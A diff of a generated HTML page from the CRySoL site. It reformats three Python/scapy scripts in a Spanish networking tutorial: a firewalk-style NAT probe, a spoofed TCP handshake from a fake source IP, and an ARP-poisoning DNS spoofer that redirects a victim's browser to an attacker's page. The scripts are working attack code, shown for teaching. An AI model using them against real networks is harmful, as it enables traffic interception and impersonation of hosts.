@@ -5822,49 +5822,56 @@
 <p>Cambia el programa anterior para que use <code>TCP()</code> en lugar de <code>ICMP()</code> y deja que use el <code>dport=80</code>. Al ejecutarlo probablemente fallará porque la última respuesta no fue <span class="caps">ICMP</span>, sino una respuesta <span class="caps">TCP</span> que no tiene el campo &#8216;type&#8217;. Pero eso no importa. Mira el valor del &#8216;ttl&#8217; y si sigue siendo 15 (como es mi caso), el puerto no está NATeado.</p>
 <p>Para hacerlo más automático, aquí está el script completo. Requiere los argumentos &#8216;host&#8217; y &#8216;dport&#8217;:</p>
 <div>
-<p>{% highlight python %}<br />
-  #!/usr/bin/env python</p>
-import sys
-from scapy import *
-conf.verb=0
-if len(sys.argv) != 3:
-print &#8220;Usage: ./firewalk.py <target> <dport>&#8221;
-sys.exit(1)
-dest=sys.argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>
-port=sys.argv<sup class="footnote" id="fnr2"><a href="#fn2">2</a></sup>
-ttl = 0
-def mkicmppacket():
-global ttl
-ttl = ttl + 1
-p = <acronym title="dst=dest, ttl=ttl"><span class="caps">IP</span></acronym>/<span class="caps">ICMP</span>()
-return p
-def mktcppacket():
-global ttl, dest, port
-ttl = ttl + 1
-p = <acronym title="dst=dest, ttl=ttl"><span class="caps">IP</span></acronym>/<acronym title="dport=int(port"><span class="caps">TCP</span></acronym>, flags=&#8220;S&#8221;)
-return p
-res = sr1(mkicmppacket())
-while res.type == 11:
-res = sr1(mkicmppacket())
-print &#8220;+&#8221;
-nat_ttl = ttl
-<ol>
-	<li>Since we now know our minimum <span class="caps">TTL</span>, we don&#8217;t need to reset <span class="caps">TTL</span> to zero</li>
-	<li>We do need to decrease <span class="caps">TTL</span> or otherwise mkpacket will increase it again</li>
-	<li>which would result in every port being detected as forwarded<br />
-  ttl = ttl &#8211; 1</li>
-</ol>
-res = sr1(mktcppacket())
-while res.proto == 1 and res.type == 11:
-res = sr1(mktcppacket())
-if res.proto != 6:
-print &#8220;Error&#8221;
-sys.exit(1)
-if nat_ttl == ttl: print &#8220;Not NATed (&#8221; + str(nat_ttl) + &quot;, &quot; + str(ttl) + &#8220;)&#8221;
-else: print &quot;This port is NATed. firewall <span class="caps">TTL</span> is &quot; + str(nat_ttl) + &quot;, <span class="caps">TCP</span> port <span class="caps">TTL</span> is &quot; + str(ttl)
-sys.exit(0)
-<p>{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="c1">#!/usr/bin/env python
+</span>
+  <span class="kn">import</span> <span class="nn">sys</span>
+  <span class="kn">from</span> <span class="nn">scapy</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="n">conf</span><span class="p">.</span><span class="n">verb</span><span class="o">=</span><span class="mi">0</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+      <span class="k">print</span> <span class="s">"Usage: ./firewalk.py &lt;target&gt; &lt;dport&gt;"</span>
+      <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="n">dest</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">port</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+  <span class="n">ttl</span> <span class="o">=</span> <span class="mi">0</span>
+
+  <span class="k">def</span> <span class="nf">mkicmppacket</span><span class="p">():</span>
+      <span class="k">global</span> <span class="n">ttl</span>
+      <span class="n">ttl</span> <span class="o">=</span> <span class="n">ttl</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">p</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">dest</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="n">ttl</span><span class="p">)</span><span class="o">/</span><span class="n">ICMP</span><span class="p">()</span>
+      <span class="k">return</span> <span class="n">p</span>
+
+  <span class="k">def</span> <span class="nf">mktcppacket</span><span class="p">():</span>
+      <span class="k">global</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">port</span>
+      <span class="n">ttl</span> <span class="o">=</span> <span class="n">ttl</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">p</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">dest</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="n">ttl</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="n">flags</span><span class="o">=</span><span class="s">"S"</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">p</span>
+
+  <span class="n">res</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">mkicmppacket</span><span class="p">())</span>
+  <span class="k">while</span> <span class="n">res</span><span class="p">.</span><span class="nb">type</span> <span class="o">==</span> <span class="mi">11</span><span class="p">:</span>
+      <span class="n">res</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">mkicmppacket</span><span class="p">())</span>
+      <span class="k">print</span> <span class="s">"+"</span>
+
+  <span class="n">nat_ttl</span> <span class="o">=</span> <span class="n">ttl</span>
+  <span class="c1"># Since we now know our minimum TTL, we don't need to reset TTL to zero
+</span>  <span class="c1"># We do need to decrease TTL or otherwise mkpacket will increase it again
+</span>  <span class="c1"># which would result in every port being detected as forwarded
+</span>  <span class="n">ttl</span> <span class="o">=</span> <span class="n">ttl</span> <span class="o">-</span> <span class="mi">1</span>
+
+  <span class="n">res</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">mktcppacket</span><span class="p">())</span>
+  <span class="k">while</span> <span class="n">res</span><span class="p">.</span><span class="n">proto</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">res</span><span class="p">.</span><span class="nb">type</span> <span class="o">==</span> <span class="mi">11</span><span class="p">:</span>
+      <span class="n">res</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">mktcppacket</span><span class="p">())</span>
+
+  <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">proto</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">:</span>
+      <span class="k">print</span> <span class="s">"Error"</span>
+      <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="n">nat_ttl</span> <span class="o">==</span> <span class="n">ttl</span><span class="p">:</span> <span class="k">print</span> <span class="s">"Not NATed ("</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">nat_ttl</span><span class="p">)</span> <span class="o">+</span> <span class="s">", "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span> <span class="o">+</span> <span class="s">")"</span>
+  <span class="k">else</span><span class="p">:</span> <span class="k">print</span> <span class="s">"This port is NATed. firewall TTL is "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">nat_ttl</span><span class="p">)</span> <span class="o">+</span> <span class="s">", TCP port TTL is "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
+
+  <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></code></pre></figure></div>
 <p>Veamos cómo funciona:</p>
 <pre class="console">
   $ sudo ./firewalk.py XX.XXX.XXX.XX 5900
@@ -5886,28 +5893,32 @@ sys.exit(0)
 <p>Lo siguiente que vamos a hacer es muy divertido. Probablemente, muchos no comprendáis porqué me parece tan excitante. Lo que vamos a hacer es crear una conexión <span class="caps">TCP</span> a un sistema local en la <span class="caps">LAN</span> desde una dirección IP ficticia. Esto significa que vamos a hacer spoofing de la conexión, sólo spoofing no-ciego desafortunadamente. El uso de esta técnica es únicamente educativo. Creo que es excitante porque esta teoría de <span class="caps">TCP</span> que aprendí hace mucho tiempo es el ejemplo más real de conexión <span class="caps">TCP</span> que jamás he visto. Creo que cualquier profesor que explique <span class="caps">TCP</span>/IP debería usarlo como un ejemplo en clase en lugar de toda esa teoría abstracta sobre el mecanismo de ventana deslizante y mierdas :-) <sup class="footnote" id="fnr4"><a href="#fn4">4</a></sup>.</p>
 <p>Echa un vistazo a este script:</p>
 <div>
-<p>{% highlight python %}<br />
-  #!/usr/bin/env python</p>
-import sys
-from scapy import *
-conf.verb=0
-if len(sys.argv) != 4:
-print &#8220;Usage: ./spoof.py <target> <spoofed_ip> <port>&#8221;
-sys.exit(1)
-target = sys.argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>
-spoofed_ip = sys.argv<sup class="footnote" id="fnr2"><a href="#fn2">2</a></sup>
-port = int(sys.argv<sup class="footnote" id="fnr3"><a href="#fn3">3</a></sup>)
-p1=<acronym title="dst=target,src=spoofed_ip"><span class="caps">IP</span></acronym>/<acronym title="dport=port,sport=5000,flags=&#39;S&#39;"><span class="caps">TCP</span></acronym>
-send(p1)
-print &quot;Okay, <span class="caps">SYN</span> sent. Enter the sniffed sequence number now: &quot;
-seq=sys.stdin.readline()
-print &quot;Okay, using sequence number &quot; + seq
-seq=int(seq[:-1])
-p2=<acronym title="dst=target,src=spoofed_ip"><span class="caps">IP</span></acronym>/<acronym title="dport=port,sport=5000,flags=&#39;A&#39;,ack=seq+1,seq=1"><span class="caps">TCP</span></acronym>
-send(p2)
-print &#8220;Okay, final <span class="caps">ACK</span> sent. Check netstat on your target :-)&#8221;
-<p>{% endhighlight %}</p>
-</div>
+<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="c1">#!/usr/bin/env python
+</span>
+  <span class="kn">import</span> <span class="nn">sys</span>
+  <span class="kn">from</span> <span class="nn">scapy</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="n">conf</span><span class="p">.</span><span class="n">verb</span><span class="o">=</span><span class="mi">0</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+      <span class="k">print</span> <span class="s">"Usage: ./spoof.py &lt;target&gt; &lt;spoofed_ip&gt; &lt;port&gt;"</span>
+      <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">spoofed_ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
+
+  <span class="n">p1</span><span class="o">=</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">,</span><span class="n">src</span><span class="o">=</span><span class="n">spoofed_ip</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">port</span><span class="p">,</span><span class="n">sport</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span><span class="n">flags</span><span class="o">=</span><span class="s">'S'</span><span class="p">)</span>
+  <span class="n">send</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
+  <span class="k">print</span> <span class="s">"Okay, SYN sent. Enter the sniffed sequence number now: "</span>
+
+  <span class="n">seq</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
+  <span class="k">print</span> <span class="s">"Okay, using sequence number "</span> <span class="o">+</span> <span class="n">seq</span>
+
+  <span class="n">seq</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">seq</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+  <span class="n">p2</span><span class="o">=</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">,</span><span class="n">src</span><span class="o">=</span><span class="n">spoofed_ip</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">port</span><span class="p">,</span><span class="n">sport</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span><span class="n">flags</span><span class="o">=</span><span class="s">'A'</span><span class="p">,</span><span class="n">ack</span><span class="o">=</span><span class="n">seq</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">seq</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+  <span class="n">send</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span>
+
+  <span class="k">print</span> <span class="s">"Okay, final ACK sent. Check netstat on your target :-)"</span></code></pre></figure></div>
 <p>Cuando &#8220;spoofeas&#8221; tu dirección IP, debes asegurarte de que usas una dirección que está fuera de tu <span class="caps">LAN</span>, de otro modo, tu objetivo buscará la dirección <span class="caps">MAC</span> del emisor ficticio usando <span class="caps">ARP</span>. En nuestro caso él asume que los paquetes spoofeados vienen del enrutador y enviará las respuestas a la <span class="caps">MAC</span> del enrutador. Pero si necesitas usar una IP de tu <span class="caps">LAN</span> puede resolverlo poniendo el siguiente código después del envío &#8220;<span class="caps">SYN</span>&#8221;:</p>
 <pre>
   p = ARP()
@@ -6052,67 +6063,75 @@ Host R: 192.168.123.254
 <p>Para &#8220;spoofear&#8221; <span class="caps">DNS</span> necesitamos construir una respuesta <span class="caps">DNS</span> que tenga sentido.. lo que significa que debe responder con el ID correcto a la petición correcta. Para lograrlo necesitamos capturar los paquetes <span class="caps">DNS</span> emitidos por B. El único modo de hacer esto es usar una técnica adicional para redirigir al host B el tráfico destinado a R. Lo haremos mediante envenenamiento <span class="caps">ARP</span>. Si enviamos un paquete <span class="caps">ARP</span> correctamente sintetizado antes de la consulta <span class="caps">DNS</span>, podremos capturar el paquete <span class="caps">DNS</span> y falsificar la respuesta. Generaremos una respuesta falsa con la dirección de A logrando que el navegador cargue y visualice nuestra página maliciosa!</p>
 <p>Estudia y adapta el siguiente código:</p>
 <div>
-<p>{% highlight python %}<br />
-  #!/usr/bin/env python</p>
-import sys
-from scapy import *
-conf.verb=1
+<figure class="highlight"><pre><code class="language-python" data-lang="python">  <span class="c1">#!/usr/bin/env python
+</span>
+  <span class="kn">import</span> <span class="nn">sys</span>
+  <span class="kn">from</span> <span class="nn">scapy</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="n">conf</span><span class="p">.</span><span class="n">verb</span><span class="o">=</span><span class="mi">1</span>
 
-			<ol>
-				<li>Adapt the following settings ####<br />
-  conf.iface = &#8216;eth2&#8217;<br />
-  mac_address = &#8216;00:11:22:AA:BB:CC&#8217; # Real Mac address of interface conf.iface (Host A)<br />
-  ####</li>
-			</ol>if len(sys.argv) != 4:
-print &#8220;Usage: ./spoof.py <dns_server> <victim> <impersonating_host>&#8221;
-sys.exit(1)
-dns_server = sys.argv<sup class="footnote" id="fnr1"><a href="#fn1">1</a></sup>
-target=sys.argv<sup class="footnote" id="fnr2"><a href="#fn2">2</a></sup>
-malhost = sys.argv<sup class="footnote" id="fnr3"><a href="#fn3">3</a></sup>
-timevalid = &#8216;\x00\x00\x07\x75&#8217;
-alen = &#8216;\x00\x04&#8217;
-def arpspoof(psrc, pdst, mac):
-a = <span class="caps">ARP</span>()
-a.op = 2
-a.hwsrc = mac
-a.psrc = psrc
-a.hwdst = &#8220;ff:ff:ff:ff:ff:ff&#8221;
-a.pdst = pdst
-send(a)
-def mkdnsresponse(dr, malhost):
-d = <span class="caps">DNS</span>()
-d.id = dr.id
-d.qr = 1
-d.opcode = 16
-d.aa = 0
-d.tc = 0
-d.rd = 0
-d.ra = 1
-d.z = 8
-d.rcode = 0
-d.qdcount = 1
-d.ancount = 1
-d.nscount = 0
-d.arcount = 0
-d.qd = str(dr.qd)
-d.an = str(dr.qd) + timevalid + alen + inet_aton(malhost)
-return d
-ethlen = len(Ether())
-iplen = len(<acronym title=")"><span class="caps">IP</span></acronym>
-udplen = len(<acronym title=")"><span class="caps">UDP</span></acronym>
-arpspoof(dns_server, target, mac_address)
-p = sniff(filter=&#8216;port 53&#8217;, iface=conf.iface, count=1)
-e = p<sup class="footnote" id="fnr0"><a href="#fn0">0</a></sup>
-t = str(e)
-i = <acronym title="t[ethlen:]"><span class="caps">IP</span></acronym>
-u = <acronym title="t[ethlen + iplen:]"><span class="caps">UDP</span></acronym>
-d = <acronym title="t[ethlen + iplen + udplen:]"><span class="caps">DNS</span></acronym>
-dpkt = mkdnsresponse(d, malhost)
-dpkt.display()
-f = <acronym title="src=i.dst, dst=i.src"><span class="caps">IP</span></acronym>/<acronym title="sport=u.dport, dport=u.sport"><span class="caps">UDP</span></acronym>/dpkt
-send(f)
-<p>{% endhighlight %}</p>
-</div>
+  <span class="c1">#### Adapt the following settings ####
+</span>  <span class="n">conf</span><span class="p">.</span><span class="n">iface</span> <span class="o">=</span> <span class="s">'eth2'</span>
+  <span class="n">mac_address</span> <span class="o">=</span> <span class="s">'00:11:22:AA:BB:CC'</span> <span class="c1"># Real Mac address of interface conf.iface (Host A)
+</span>  <span class="c1">####
+</span>
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+      <span class="k">print</span> <span class="s">"Usage: ./spoof.py &lt;dns_server&gt; &lt;victim&gt; &lt;impersonating_host&gt;"</span>
+      <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="n">dns_server</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">target</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+  <span class="n">malhost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+
+  <span class="n">timevalid</span> <span class="o">=</span> <span class="s">'</span><span class="si">\</span><span class="se">x00</span><span class="si">\</span><span class="se">x00</span><span class="si">\</span><span class="se">x07</span><span class="si">\</span><span class="se">x75</span><span class="s">'</span>
+  <span class="n">alen</span> <span class="o">=</span> <span class="s">'</span><span class="si">\</span><span class="se">x00</span><span class="si">\</span><span class="se">x04</span><span class="s">'</span>
+
+  <span class="k">def</span> <span class="nf">arpspoof</span><span class="p">(</span><span class="n">psrc</span><span class="p">,</span> <span class="n">pdst</span><span class="p">,</span> <span class="n">mac</span><span class="p">):</span>
+      <span class="n">a</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">()</span>
+      <span class="n">a</span><span class="p">.</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+      <span class="n">a</span><span class="p">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">mac</span>
+      <span class="n">a</span><span class="p">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">psrc</span>
+      <span class="n">a</span><span class="p">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="s">"ff:ff:ff:ff:ff:ff"</span>
+      <span class="n">a</span><span class="p">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">pdst</span>
+      <span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+  <span class="k">def</span> <span class="nf">mkdnsresponse</span><span class="p">(</span><span class="n">dr</span><span class="p">,</span> <span class="n">malhost</span><span class="p">):</span>
+      <span class="n">d</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">()</span>
+      <span class="n">d</span><span class="p">.</span><span class="nb">id</span> <span class="o">=</span> <span class="n">dr</span><span class="p">.</span><span class="nb">id</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">qr</span> <span class="o">=</span> <span class="mi">1</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">opcode</span> <span class="o">=</span> <span class="mi">16</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">aa</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">tc</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">rd</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">ra</span> <span class="o">=</span> <span class="mi">1</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">z</span> <span class="o">=</span> <span class="mi">8</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">rcode</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">qdcount</span> <span class="o">=</span> <span class="mi">1</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">ancount</span> <span class="o">=</span> <span class="mi">1</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">nscount</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">arcount</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">qd</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">dr</span><span class="p">.</span><span class="n">qd</span><span class="p">)</span>
+      <span class="n">d</span><span class="p">.</span><span class="n">an</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">dr</span><span class="p">.</span><span class="n">qd</span><span class="p">)</span> <span class="o">+</span> <span class="n">timevalid</span> <span class="o">+</span> <span class="n">alen</span> <span class="o">+</span> <span class="n">inet_aton</span><span class="p">(</span><span class="n">malhost</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">d</span>
+
+  <span class="n">ethlen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">Ether</span><span class="p">())</span>
+  <span class="n">iplen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">IP</span><span class="p">())</span>
+  <span class="n">udplen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">UDP</span><span class="p">())</span>
+
+  <span class="n">arpspoof</span><span class="p">(</span><span class="n">dns_server</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">mac_address</span><span class="p">)</span>
+  <span class="n">p</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">'port 53'</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">conf</span><span class="p">.</span><span class="n">iface</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+
+  <span class="n">e</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="n">t</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+  <span class="n">i</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">ethlen</span><span class="p">:])</span>
+  <span class="n">u</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">ethlen</span> <span class="o">+</span> <span class="n">iplen</span><span class="p">:])</span>
+  <span class="n">d</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">ethlen</span> <span class="o">+</span> <span class="n">iplen</span> <span class="o">+</span> <span class="n">udplen</span><span class="p">:])</span>
+
+  <span class="n">dpkt</span> <span class="o">=</span> <span class="n">mkdnsresponse</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">malhost</span><span class="p">)</span>
+
+  <span class="n">dpkt</span><span class="p">.</span><span class="n">display</span><span class="p">()</span>
+
+  <span class="n">f</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">i</span><span class="p">.</span><span class="n">dst</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">i</span><span class="p">.</span><span class="n">src</span><span class="p">)</span><span class="o">/</span><span class="n">UDP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="n">u</span><span class="p">.</span><span class="n">dport</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="n">u</span><span class="p">.</span><span class="n">sport</span><span class="p">)</span><span class="o">/</span><span class="n">dpkt</span>
+  <span class="n">send</span><span class="p">(</span><span class="n">f</span><span class="p">)</span></code></pre></figure></div>
 <p>Así es cómo funciona, antes de abrir cualquier página en el host B ejecuta algo como esto en el host A (asegurate de cambiar la variable <code>mac_address</code>):</p>
 <pre class="console">
   detach@luna:~/lab/scapy-0.9.17$ ./spoof.py
@@ -6242,7 +6261,7 @@ send(f)
           and <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a>.
 	  See <a href="https://github.com/CRySoL/web.source" target="_blank">site sources</a>.
 	  <br/>
-	  Generated at 2020-04-25 02:51:16 -0500
+	  Generated at 2020-04-25 05:57:01 -0500
 	  <br/>
 		<a href="https://github.com/CRySoL/CRySoL.github.io/actions">
 		   <img src="https://github.com/CRySoL/CRySoL.github.io/workflows/Jekyll%20automatic%20build/badge.svg" alt="_built">
